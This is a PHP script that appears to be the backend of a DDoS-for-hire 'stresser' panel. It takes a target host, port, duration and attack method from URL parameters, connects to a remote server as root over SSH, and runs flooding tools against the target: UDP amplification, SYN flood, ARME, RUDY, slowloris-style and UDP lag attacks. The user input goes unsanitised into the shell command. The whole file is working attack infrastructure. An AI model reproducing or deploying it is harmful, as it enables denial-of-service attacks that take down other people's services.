<?php
ignore_user_abort(true);
set_time_limit(0);

//start config
$server_ip = "SERVER IP"; //Change to server IP
$server_pass = "SERVER PASS"; //Change to server password
$server_user = "root"; //Only change this if you're using a user othen then root
//end config

$host = $_GET['target'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = strtoupper($_GET['method']);


if ($method == "UDP") { $command = "./amp ".$host." list.txt 2 -1 ".$time; }
if ($method == "SSYN") { $command = "./essyn ".$host." ".$port." 2 -1 ".$time; }
if ($method == "ARME") { $command = "./arme ".$host." 10 proxies.txt ".$time; }
if ($method == "RUDY") { $command = "./rudy ".$host." 1 10 proxies.txt ".$time." 0"; }
if ($method == "SLOW") { $command = "./slow ".$host." 25 proxies.txt ".$time; }
if ($method == "UDPLAG") { $command = "./udplag ".$host." list.txt 10 -1 ".$time; }


if (!function_exists("ssh2_connect")) die("Function ssh2_connect doesn't exist");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
  
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
	echo "Error: Bad Login";
    } else {
	
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: Unable to Execute Command\n";
        } else {
       
            stream_set_blocking($stream, true);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
			echo "Done";
            fclose($stream);
        }
    }
}


